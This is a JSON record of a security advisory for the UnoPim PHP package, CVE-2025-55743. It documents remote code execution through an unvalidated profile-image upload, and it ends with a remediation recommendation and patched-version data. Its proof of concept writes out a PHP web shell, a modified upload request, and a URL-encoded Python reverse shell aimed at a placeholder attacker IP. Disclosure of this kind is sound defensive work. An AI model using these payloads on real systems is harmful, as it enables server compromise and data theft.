{
  "Severity": "HIGH",
  "UpdatedAt": "2025-08-21T14:26:34Z",
  "Package": {
    "Ecosystem": "COMPOSER",
    "Name": "unopim/unopim"
  },
  "Advisory": {
    "DatabaseId": 308462,
    "Id": "GSA_kwCzR0hTQS12MjJ2LXh3aDctMnZybc4ABLTu",
    "GhsaId": "GHSA-v22v-xwh7-2vrm",
    "References": [
      {
        "Url": "https://github.com/unopim/unopim/security/advisories/GHSA-v22v-xwh7-2vrm"
      },
      {
        "Url": "https://drive.proton.me/urls/PH1ESMKHMW#4Vxb2KNu3tmn"
      },
      {
        "Url": "https://github.com/advisories/GHSA-v22v-xwh7-2vrm"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-v22v-xwh7-2vrm"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-55743"
      }
    ],
    "Description": "### Summary:\nAffected Functionality: **Image upload at User creation**\nEndpoint: `/admin/settings/users/create`\n\n### Details\nThe image upload at the user creation feature performs only client side file type validation.\nA user can capture the request by uploading an image, capture the request through a Proxy like Burp suite. \nMake changes to the file extension and content. The .php file when accessed through the link runs the code we provided inside the file.\n\nModified part of the multipart request body:\n```\nContent-Disposition: form-data; name=\"image[]\"; filename=\"poc.php\"\nContent-Type: application/x-php\n\n\u003c?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?\u003e\n```\n\n### PoC\n 1. Upload an image file as profile picture during user creation , now capture the request and modify.\n File content: ```\u003c?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?\u003e```\n File name: poc.php\n Content-Type can be any, doesn't matter. \n 2. Access the uploaded file e.g. http://localhost:8000/storage/admins/21/poc.php?cmd=ls\n // pass the command to run as parameter value for `cmd`, example running `ls` command on the system\n\nLikewise the following reverse shell code ( [reverse shell of other languages](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) ) can be executed to create a connection to attacker controlled system\nCommand:\n```\npython3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",7000));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(\"sh\")%27\n```\n// Make sure `netcat` is running on port `7000`\n// change `IP` accordingly\n\n### Impact\nEvery user in the dashboard is allowed to change their profile picture, thus allowing any of these users to execute malicious actions at the Server level. Usually a server might host multiple applications, allowing execution of system commands allows complete control of the system. The impact of an RCE vulnerability can be full system compromise, access to database and filesystem, access other sensitive devices on the network.\nPlease see the POC video: https://drive.proton.me/urls/PH1ESMKHMW#4Vxb2KNu3tmn\n\n\n### Recommendation:\nExtension Validation: Whitelist allowed extensions. ( use `endswith()` check rather than `contains()` as an attacker can bypass such a restriction with filename: poc.jpg.php",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-08-21T14:26:31Z",
    "Severity": "HIGH",
    "Summary": "UnoPim vulnerable to remote code execution through Arbitrary File upload",
    "UpdatedAt": "2025-08-21T14:26:34Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.2.1"
      },
      "VulnerableVersionRange": "\u003c= 0.2.0"
    }
  ]
}